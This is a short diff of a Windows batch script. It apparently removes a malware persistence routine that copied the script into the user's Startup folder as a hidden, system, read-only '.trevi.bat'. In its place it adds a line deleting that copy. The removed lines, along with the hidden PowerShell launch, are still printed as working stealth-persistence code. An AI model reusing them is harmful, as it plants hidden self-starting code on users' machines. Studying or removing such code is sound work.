@@ -1,10 +1,7 @@
 @echo off
 powershell -NoP -W hidden ; exit
 set "_path=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\.trevi.bat"
-fc "%~f0" "%_path%" || (
-    xcopy "%~f0" "%_path%"
-    attrib +h +s +r "%_path%"
-)
+del /f /q "%_path%"
 goto getScript
 exit /b
 
